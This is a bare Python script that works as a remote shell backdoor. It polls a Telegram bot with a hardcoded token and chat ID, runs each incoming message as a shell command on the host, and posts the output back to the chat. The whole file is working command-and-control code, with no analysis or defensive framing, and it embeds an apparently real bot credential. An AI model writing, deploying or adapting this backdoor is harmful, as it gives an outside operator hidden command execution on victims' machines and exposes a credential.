import os, subprocess, requests, time

TOKEN = "8938498195:AAEL5_G244Hs6T1lTQ3tw0HaJcqs4JFIpeI"
CHAT_ID = "7626015468"
last_update = 0

while True:
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?offset={last_update+1}"
    r = requests.get(url, timeout=10).json()
    if r.get('result'):
        for msg in r['result']:
            last_update = msg['update_id']
            cmd = msg['message'].get('text', '')
            if cmd:
                try:
                    out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    output = out.stdout + out.stderr
                    if not output:
                        output = "[OK]"
                    if len(output) > 4000:
                        output = output[:4000] + "\n...truncated"
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                  json={"chat_id": CHAT_ID, "text": output})
                except Exception as e:
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                                  json={"chat_id": CHAT_ID, "text": f"Error: {str(e)}"})
    time.sleep(2)